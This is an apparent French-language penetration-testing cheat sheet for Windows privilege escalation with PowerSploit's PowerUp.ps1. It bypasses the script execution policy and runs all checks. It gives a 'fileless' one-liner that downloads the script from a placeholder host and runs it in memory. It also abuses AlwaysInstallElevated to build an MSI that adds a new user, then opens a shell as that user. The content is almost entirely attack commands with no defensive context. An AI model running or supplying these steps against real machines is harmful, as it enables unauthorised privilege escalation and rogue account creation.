
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1



1. Changer la politique d'execution des scripts

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

2. Importer le module

```powershell
Import-Module .\PowerUp.ps1
```

3. Tous les checks

```powershell
Invoke-AllChecks
```


#Fileless 

```powershell
iex(New-Object Net.WebClient).DownloadString('http://<ip>:<port>/PowerUp.ps1'); Invoke-AllChecks
```


## Always Install Elevated

1. Créer "User-AddMSI"

```powershell-session
Write-UserAddMSI
```

3. Executer UserAddMSI et renseigner les infos
4. runas avec le new user

```cmd
runas /user:user cmd
```


